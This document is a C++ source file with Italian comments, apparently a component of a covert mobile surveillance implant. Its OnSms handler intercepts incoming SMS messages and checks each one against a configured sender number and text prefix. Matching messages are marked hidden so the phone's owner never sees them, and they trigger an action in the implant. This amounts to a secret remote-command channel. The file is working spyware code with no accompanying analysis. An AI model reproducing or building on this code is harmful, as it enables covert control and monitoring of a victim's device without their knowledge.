#include "Event.h"
#include "Common.h"
#include "Conf.h"
#include "Date.h"
#include "Log.h"
#include "Observer.h"

DWORD WINAPI OnSms(LPVOID lpParam) {
	Event *me = (Event *)lpParam;
	Configuration *conf;
	HANDLE eventHandle;
	wstring number, text;
	Observer *observerObj = Observer::self();
	HMODULE hSmsFilter;
	IpcMsg *pMsg;

	eventHandle = me->getEvent();

	me->setStatus(EVENT_RUNNING);
	conf = me->getConf();

	try {
		number = conf->getString(L"number");
	} catch (...) {
		number = L"";
	}

	if (number.empty()) {
		me->setStatus(EVENT_STOPPED);
		return 0;
	}

	try {
		text = conf->getString(L"text");
	} catch (...) {
		text = L"";
	}

	// Carichiamo l'evento solo se la DLL e' presente
	hSmsFilter = LoadLibrary(SMS_DLL);

	if (hSmsFilter == NULL) {
		me->setStatus(EVENT_STOPPED);
		DBG_TRACE(L"Debug - Sms.cpp - Sms [SMS dll not found, exiting]\n", 5, FALSE);
		return 0;
	}

	FreeLibrary(hSmsFilter);

	if (observerObj == NULL) {
		me->setStatus(EVENT_STOPPED);
		DBG_TRACE(L"Debug - Sms.cpp - Sms [Observer not found or no params, exiting]\n", 5, FALSE);
		return 0;
	}

	// Registriamoci all'observer
	if (observerObj->Register(GetCurrentThreadId()) == FALSE) {
		me->setStatus(EVENT_STOPPED);
		DBG_TRACE(L"Debug - Sms.cpp - Sms [cannot register to Observer, exiting]\n", 5, FALSE);
		return 0;
	}

	DBG_TRACE(L"Debug - Sms.cpp - Sms event started\n", 5, FALSE);

	// La lunghezza del numero e dell'sms include anche il NULL-terminatore.
	LOOP {
		// Se abbiamo un messaggio nella coda...
		pMsg = (pIpcMsg)observerObj->GetMessage();

		if (pMsg != NULL) {
			DWORD dwSmsNumberLen, dwSmsTextLen;
			BYTE *pSmsNum, *pSmsText, *pTmp;

			// Formato messaggio: Lunghezza Numero | Numero | Lunghezza Messaggio | Messaggio
			pTmp = &pMsg->Msg[0];
			CopyMemory(&dwSmsNumberLen, pTmp, sizeof(dwSmsNumberLen)); 
			pTmp += sizeof(dwSmsNumberLen);

			pSmsNum = pTmp;
			pTmp += dwSmsNumberLen;

			CopyMemory(&dwSmsTextLen, pTmp, sizeof(dwSmsTextLen)); 
			pTmp += sizeof(dwSmsTextLen);

			pSmsText = pTmp;
			pTmp += dwSmsTextLen;

			// Vediamo se e' il nostro messaggio
			// dwSmsNumberLen == dwNumLen && RtlEqualMemory(pSmsNum, wNumber, dwNumLen)
			if (wcsstr((WCHAR *)pSmsNum, number.c_str()) && 
				!_wcsnicmp((WCHAR *)pSmsText, text.c_str(), text.length())) {
					observerObj->MarkMessage(GetCurrentThreadId(), IPC_HIDE, TRUE);

					me->triggerStart();
#ifdef _DEBUG
					wstring strDebug = L"Debug - Events.cpp - OnSms msg: ";
					strDebug += (PWCHAR)pSmsText;
					strDebug += L" number: ";
					strDebug += (PWCHAR)pSmsNum;
					strDebug += L" marked as Hidden\n";

					DBG_TRACE((PWCHAR)strDebug.c_str(), 5, FALSE);
#endif
			} else {
				observerObj->MarkMessage(GetCurrentThreadId(), IPC_PROCESS, FALSE);
#ifdef _DEBUG
				wstring strDebug = L"Debug - Events.cpp - OnSms msg: ";
				strDebug += (PWCHAR)pSmsText;
				strDebug += L" number: ";
				strDebug += (PWCHAR)pSmsNum;
				strDebug += L" marked as Process\n";

				DBG_TRACE((PWCHAR)strDebug.c_str(), 5, FALSE);
#endif
			}
		}

		WaitForSingleObject(eventHandle, 2000);

		if (me->shouldStop()) {
			observerObj->UnRegister(GetCurrentThreadId());

			DBG_TRACE(L"Debug - Sms.cpp - Sms Event is Closing\n", 1, FALSE);
			me->setStatus(EVENT_STOPPED);

			return 0;
		}
	}

	observerObj->UnRegister(GetCurrentThreadId());
	me->setStatus(EVENT_STOPPED);
	return 0;
}